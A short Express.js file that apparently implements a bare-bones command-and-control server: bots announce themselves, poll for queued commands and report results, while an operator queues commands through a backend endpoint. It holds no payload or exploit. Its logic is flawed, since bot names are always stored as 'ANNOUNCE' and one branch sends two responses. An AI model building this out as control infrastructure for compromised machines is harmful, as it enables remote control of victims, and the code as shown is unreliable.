const express = require("express");
const app = express();
const port = 8000;

app.use(express.json());

const bots = []; // { id: 1, name: "Bot 1", status: "online" },
const commands = []; // { name : "PING", botId: 1 }



function registerBot(bot) {
    console.log("registering bot : " + bot.name);
    bots.push(bot)
}

function registerCommand(command) {
    console.log("registering command : " + command.name);
    commands.push(command)
}

function getCommands(botId) {
    return commands.filter(c => c.botId === botId);
}




app.get("/backend/bots", (req, res) => {
    res.send(JSON.stringify(bots));
});

app.post("/backend/commands", (req, res) => {
    const payload = req.body; 
    console.log("receiving a POST request from : " + req.ip);

    if (payload.name === "SEND_COMMAND") {
        registerCommand({ name: payload.command, botId: payload.botId });
        console.log("sending command to bot : " + payload.botId);
        res.send("OK");
    }

});

app.get("/backend/commands", (req, res) => {
    res.send(JSON.stringify(commands));
});


app.post("/", (req, res) => {
    console.log("receiving a POST request from : " + req.ip);
    console.log("request body : " + JSON.stringify(req.body));

    const payload = req.body; 

    if (payload.name === "ANNOUNCE") {
        registerBot({ id: payload.id, name: payload.name, status: "online"});
    }

    else if (payload.name === "GET_COMMANDS") {
        console.log("sending commands to bot : " + payload.id);
        res.send(JSON.stringify(getCommands(payload.id)));
    }
    else if (payload.name === "COMMAND_RESULT") {
        console.log("command result from bot : " + payload.id);
        console.log("command result : " + payload.result);
        

    } else {
        console.log("unknown request");
    }

    res.send("OK");

   
});



app.listen(port, () => {
  console.log(`Application exemple à l'écoute sur le port ${port}!`);
});